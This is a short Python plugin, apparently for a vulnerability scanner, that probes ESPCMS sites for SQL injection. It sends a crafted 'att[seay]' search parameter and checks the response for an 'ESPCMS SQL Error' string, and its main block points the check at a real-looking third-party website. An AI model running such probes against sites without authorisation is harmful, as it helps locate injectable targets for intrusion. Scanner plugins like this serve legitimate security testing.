#!/usr/bin/env python
# http://www.cnseay.com/archives/2383

def assign(service, arg):
    if service == "espcms":
        return True, arg

def audit(arg):
    url = arg
    code, _, res, _, _ = curl.curl(url + 'index.php?ac=search&at=list&att[seay]=testvul')
    if code == 200 and res.find('ESPCMS SQL Error:') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('espcms', 'http://www.fr8.cn/')[1])
